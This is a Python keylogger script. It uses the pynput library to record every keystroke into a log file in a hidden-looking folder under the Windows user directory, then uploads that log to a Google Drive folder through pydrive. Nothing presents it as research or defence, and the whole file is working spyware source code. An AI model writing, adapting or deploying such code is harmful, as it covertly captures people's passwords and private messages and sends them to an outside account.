from pynput import keyboard
import time
import os
import uuid
import threading
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive


ROOT = 'C:\\Users\\Owner\\.systemlogs\\'
# LOG = str(uuid.uuid4().hex)+'.txt'
LOG = 'fa336456bdb14e98bd47a84cfbdb6b87.txt'
KEY = keyboard.Key
STROKE = False
BANNER = True
if not os.path.exists(ROOT):
    os.mkdir(ROOT)




def sendToHost():
    gauth = GoogleAuth()
    drive = GoogleDrive(gauth)
    gfile = drive.CreateFile({'parents': [{'id': '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'}]})
    gfile.SetContentFile(os.path.join(ROOT,LOG))
    gfile.Upload()
    
def on_press(key):
    pass

def on_release(key):
    global BANNER,STROKE
    STROKE = True
    keystroke = str(key).strip("'")
    f = open(os.path.join(ROOT,LOG), 'a+')
    if BANNER == True:
        f.write(f'\n [{time.ctime()}]' )
        BANNER = False
    if keystroke.isalnum():
        f.write(keystroke)
    elif key == KEY.space:
        f.write(' ')
    else:
        f.write(f' [{key}] ')
    if key == KEY.esc:
        return False
    f.close()


def Logger():
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

def Timer():
    global STROKE, BANNER
    while True:
        if STROKE == True:
            STROKE = False
            time.sleep(30)
            BANNER = True


thread1 = threading.Thread(target=Logger)
thread2 = threading.Thread(target=Timer)
# thread1.start()
# thread2.start()

sendToHost()
